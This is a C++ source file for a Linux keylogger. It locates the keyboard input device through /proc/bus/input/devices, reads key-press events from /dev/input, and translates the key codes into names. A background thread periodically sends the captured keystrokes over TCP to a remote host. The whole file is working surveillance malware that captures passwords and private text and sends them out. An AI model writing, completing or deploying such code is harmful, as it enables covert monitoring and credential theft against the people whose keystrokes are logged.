#include "logger.hpp"
using namespace logger;

std::vector<std::string> keyCodes = {
	"KEYBOARD ERROR",
	"ESC",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	"0",
	"-",
	"=",
	"BACKSPACE",
	"TAB",
	"q",
	"w",
	"e",
	"r",
	"t",
	"y",
	"u",
	"i",
	"o",
	"p",
	"[",
	"]",
	"ENTER",
	"LEFT CNTRL",
	"a",
	"s",
	"d",
	"f",
	"g",
	"h",
	"j",
	"k",
	"l",
	";",
	"'",
	"`",
	"LEFT SHIFT",
	"\\",
	"z",
	"x",
	"c",
	"v",
	"b",
	"n",
	"m",
	",",
	".",
	"/",
	"RIGHT SHIFT",
	"KP *",
	"LEFT ALT",
	"SPACE",
	"CAPS LOCK",
	"F1",
	"F2",
	"F3",
	"F4",
	"F5",
	"F6",
	"F7",
	"F8",
	"F9",
	"F10",
	"NUM LOCK",
	"SCROLL LOCK",
	"KP HOME 7",
	"KP UP 8",
	"KP PAGE UP 9",
	"KP -",
	"KP LEFT 4",
	"KP 5",
	"KP RIGHT 6",
	"KP +", // Correct
	"KP END 1",
	"KP DOWN 2",
	"KP PAGE DOWN 3", // Correct
	"KP INS 0",
	"KP DEL .", // Correct 83
	"", //84
	"", //85
	"",//86
	"F11", // 87
	"F12", //88
	"", //89
	"",//90
	"",//91
	"", //92
	"", //93
	"", //94
	"", //95
	"KP ENTER", //96
	"RIGHT CNTRL", //97
	"KP /", //98
	"PRINT SCREEN", //99
	"RIGHT ALT", //100
	"", //101
	"HOME",//102
	"UP", //103
	"PAGE UP", //104
	"LEFT", //105
	"RIGHT", //106
	"END",//107
	"DOWN",//108
	"PAGE DOWN",//109
	"INSERT",//110
	"DELETE", //111
	"", //112
	"", //113
	"", //114
	"", //115
	"", //116
	"", //117
	"", //118
	"PAUSE BREAK" //119
	"", //120
	"", //121
	"", //122
	"", //123
	"", //124
	"LEFT META", // 125
	"", //126
	"COMPOSE"//127 RIGHT CLICK MENU
};

std::string logger::getDevices() {
	std::ifstream file("/proc/bus/input/devices");
	if (!file.is_open()) {
		// TODO: error handling, log to file
		//std::cerr << "Failed to open /proc/bus/input/devices" << std::endl;
		exit(EXIT_FAILURE);
	}

	std::string result((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
	file.close();

	if (result.empty()) {
		// TODO: error handling, log to file
		//std::cerr << "No content read from /proc/bus/input/devices" << std::endl;
		exit(EXIT_FAILURE);
	}

	return result;
}

std::string logger::getHandler(std::string devices) {
	std::string handler = "";
	std::smatch m;
	std::regex regexp("Handlers=sysrq kbd event[0-9]");

	std::regex_search(devices, m, regexp);
	if (m.size() == 0) {
		std::cerr << "regex no match" << std::endl;
		exit(EXIT_FAILURE);
	}

	std::string matched = m[0];

	size_t pos = matched.find("event");
	handler = "/dev/input/" + matched.substr(pos);
	return handler;
}

void logger::sendBufferToRemoteHost(const std::string& buffer, const std::string& host, const std::string& port) {
    try {
        boost::asio::io_context io_context;

        // Resolve the host name and port number to an iterator.
        boost::asio::ip::tcp::resolver resolver(io_context);
        boost::asio::ip::tcp::resolver::results_type endpoints = resolver.resolve(host, port);

        // Create and connect the socket.
        boost::asio::ip::tcp::socket socket(io_context);
        boost::asio::connect(socket, endpoints);

        // Send
        boost::asio::write(socket, boost::asio::buffer(buffer));

    } catch (std::exception& e) {
        return; // TODO: add error handling, log to file
    }
}

void logger::connectHandler(std::string handler, std::string host, std::string port) {
	const char * fileName = handler.c_str();
	struct input_event holdEvent;
	int fd;
	std::stringstream buffer;
	std::atomic<bool> running(true);

	std::thread senderThread([&]() {
    	while (running) {
        	std::this_thread::sleep_for(std::chrono::seconds(SEND_DATA_INTERVAL));
        	std::string bufferStr = buffer.str();
        	if (!bufferStr.empty()) {
            	sendBufferToRemoteHost(bufferStr, host, port);
            	buffer.str("");
            	buffer.clear();
        	}
    	}
	});

	if ( (fd = open(fileName, O_RDONLY)) <0 ){
		// TODO: add error handling, log to file
		exit(EXIT_FAILURE);
	}

	while (true) {

		read(fd, &holdEvent, sizeof(holdEvent));

		if (holdEvent.type == EV_KEY && holdEvent.value == 1) {
			buffer << keyCodes[holdEvent.code];
		}

	}

	// TODO: add a way to stop the program and clean up resourses. handle signal
	running = false;
	senderThread.join();
	close(fd);
	return;
}
